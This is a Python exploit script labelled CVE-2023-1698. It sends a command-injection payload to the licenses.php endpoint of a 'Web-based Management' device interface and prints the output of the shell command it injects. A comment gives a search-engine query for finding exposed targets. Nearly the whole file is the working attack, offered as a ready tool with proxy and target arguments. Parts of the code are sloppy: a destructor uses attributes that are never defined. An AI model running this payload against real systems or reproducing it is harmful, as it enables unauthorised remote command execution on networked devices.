#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
#鹰图: title="Web-based Management"

import os
import json
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser
requests.packages.urllib3.disable_warnings()

class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.verify()  
    
    def banner(self):
        logo = r"""
  ______     _______     ____   ___ ____  _____       _  __   ___   ___  
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /      / |/ /_ / _ \ ( _ ) 
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____| | '_ \ (_) |/ _ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____| | (_) \__, | (_) |
 \____|  \_/  |_____|   |_____|\___/_____|____/      |_|\___/  /_/ \___/ 
                                                                                                                                                          
                                        author： Indra
                                        GitHub： https://github.com/deIndra                 
        """
        print("\033[91m" + logo + "\033[0m")
    
    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. url.txt)")
        parser.add_argument("-e", "--exp", required=False, type=str, help=f"Target exp(e.g. exp.txt)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()
    
    def proxy_server(self):
        proxy = self.args.proxy
        return proxy
     
    def respose(self,url):
        proxy = self.args.proxy
        exp = self.args.exp
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php"
        url = urljoin(url, path)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
            'Connection': 'close',
            'Content-Length': '19',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
        }
        data = '''{"package": ";'''+exp+''';#"}'''
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=20, verify=False)
            resp = response.text
            print(response.status_code)
            return resp             
        except:
            return "conn"  

   
    def verify(self):
            url = self.args.url
            repData = self.respose(url)
            repData_dict = json.loads(repData)
            if "license" in repData_dict:
                print("[+] 执行成功！！！[✅] url: {}".format(url))
                print(repData_dict["license"])
            else:
                print("[x] 未检测到漏洞！[x] url: {}".format(url))
   
    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe VulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    EXP()
